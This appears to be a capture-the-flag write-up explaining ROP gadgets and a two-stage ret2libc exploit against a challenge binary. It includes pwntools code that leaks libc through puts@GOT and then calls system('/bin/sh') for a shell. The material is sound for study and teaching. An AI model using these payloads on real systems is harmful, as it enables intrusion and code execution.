---
title: "ROP Chains — Bypassing NX"
date: 2026-02-07
description: "Using Return-Oriented Programming to execute arbitrary code when the stack is non-executable"
tags: ["ctf", "pwn", "rop"]
weight: 2
---

## Why ROP?

NX (No eXecute) prevents code execution on the stack. We can't just inject shellcode. Instead, we chain together small code snippets already in the binary — **gadgets**.

## Gadget Hunting

```bash
$ ROPgadget --binary ./ropme
0x0000000000401234 : pop rdi ; ret
0x0000000000401236 : pop rsi ; pop r15 ; ret
0x0000000000401238 : pop rdx ; ret
```

## Strategy: ret2libc

Call `system("/bin/sh")` using gadgets:

1. `pop rdi; ret` — load the address of `"/bin/sh"` into RDI
2. `ret` — alignment gadget (Ubuntu requires 16-byte stack alignment before `call`)
3. `system()` — call libc's system function

## Leaking libc Base

With ASLR, libc is loaded at a random address. We need to leak it first:

```python
from pwn import *

elf = ELF('./ropme')
libc = ELF('./libc.so.6')

# Stage 1: Leak puts@GOT
pop_rdi = 0x401234
ret = 0x40101a

payload = b'A' * 72
payload += p64(pop_rdi)
payload += p64(elf.got['puts'])
payload += p64(elf.plt['puts'])  # puts(puts@GOT)
payload += p64(elf.symbols['vuln'])  # return to vuln for stage 2

p.sendlineafter(b'> ', payload)

# Parse leaked address
leaked = u64(p.recvline().strip().ljust(8, b'\x00'))
libc_base = leaked - libc.symbols['puts']
log.info(f"libc base: {hex(libc_base)}")
```

## Stage 2: Shell

```python
system = libc_base + libc.symbols['system']
bin_sh = libc_base + next(libc.search(b'/bin/sh\x00'))

payload2 = b'A' * 72
payload2 += p64(ret)        # stack alignment
payload2 += p64(pop_rdi)
payload2 += p64(bin_sh)
payload2 += p64(system)

p.sendlineafter(b'> ', payload2)
p.interactive()
```

```
$ cat flag.txt
FLAG{r0p_ch41n_m4st3r}
```

## Key Concepts

| Concept | Purpose |
|---------|---------|
| Gadgets | Small instruction sequences ending in `ret` |
| GOT/PLT | Indirection for dynamic linking — leak target |
| ret2libc | Call libc functions instead of injecting shellcode |
| Stack alignment | x86-64 ABI requires RSP % 16 == 0 before `call` |
